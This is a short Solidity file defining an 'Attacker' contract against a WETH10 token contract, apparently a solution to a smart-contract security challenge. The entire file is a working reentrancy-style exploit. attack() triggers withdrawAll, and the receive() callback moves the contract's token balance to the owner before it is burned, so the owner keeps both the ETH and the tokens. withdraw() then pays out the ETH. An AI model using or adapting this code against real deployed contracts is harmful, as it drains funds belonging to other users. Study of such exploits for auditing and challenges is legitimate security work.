pragma solidity ^0.8.0;

import "../WETH10.sol";

// Mario Götze
contract Attacker {
    WETH10 victim;
    address owner;

    constructor(WETH10 _victim, address _owner) {
        victim = _victim;
        owner = _owner;
    }

    function attack() external {
        victim.withdrawAll();
    }

    function withdraw() external {
        require(msg.sender == owner);
        (bool success, ) = owner.call{value: address(this).balance}("");
        require(success);
    }

    receive() external payable {
        victim.transfer(owner, victim.balanceOf(address(this)));
    }
}
